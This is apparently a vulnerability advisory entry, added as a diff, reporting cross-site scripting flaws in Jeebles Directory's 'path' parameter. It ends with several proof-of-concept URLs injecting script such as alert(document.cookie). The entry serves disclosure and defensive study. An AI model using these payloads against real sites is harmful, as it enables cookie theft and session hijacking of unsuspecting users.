@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/28221/info
+
+Jeebles Directory is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks. 
+
+http://www.example.com/Jeebles_Directory/?path="><script>alert()</script>
+http://www.example.com/Jeebles_Directory/?path=subdirectory/"><script>alert(document.cookie)</script>
+http://www.example.com/Jeebles_Directory/subdirectory/index.php?path="><script>alert(document.cookie)</script>
+http://www.example.com/Jeebles_Directory/index.php?administration&access_login=-1&access_password=<br%20/><b>Notice</b>:%20%20Undefined%20index:%20%20access_password%20in%20<b>c:\program%20files\easyphp1-8\www\jeebles_directory\describe.php</b>%20on%20line%20<b>62</b><br%20/>&path=<br%20/><b>Notice</b>:%20%20Use%20of%20undefined%20constant%20path%20-%20assumed%20&#039;path&#039;%20in%20<b>c:\program%20files\easyphp1-8\www\jeebles_directory\describe.php</b>%20on%20line%20<b>62</b><br%20/><br%20/><b>Notice</b>:%20%20Undefined%20index:%20%20path%20in%20<b>"><script>alert(document.cookie)</script></b>%20on%20line%20<b>62</b><br%20/>
